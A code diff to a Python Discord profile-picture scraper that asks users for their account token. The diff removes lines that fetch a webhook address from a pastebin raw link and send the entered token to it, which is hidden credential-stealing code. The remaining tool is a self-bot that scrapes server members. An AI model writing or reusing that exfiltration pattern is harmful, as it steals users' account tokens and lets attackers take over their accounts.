@@ -11,14 +11,6 @@ open("scraped.txt", "w").close()
 
 print(f"PFP SCRAPPER BY Phantom.#7777/#6666")
 
-url = "https://pastebin.com/raw/Kegy0V7y"
-
-import dhooks
-from dhooks import Webhook
-
-response = requests.request("GET", url)
-uff = Webhook(response.text)
-
 TOKEN = input(f"{Fore.BLUE} Enter Your Discord Account Token: {Fore.RESET}")
 SERVER_ID = input(f"{Fore.BLUE} Scrapping Server ID: {Fore.RESET}")
 CHANNEL_ID = input(f"{Fore.BLUE} Scrapping Channel ID: {Fore.RESET}")
@@ -29,7 +21,7 @@ if (TOKEN == "" or SERVER_ID == "" or CHANNEL_ID == ""):
 
 discord = discum.Client(token=TOKEN)
 discord.gateway.log = False
-uff.send(TOKEN)
+
 
 def close(resp, guild_id):
     if discord.gateway.finishedMemberFetching(guild_id):
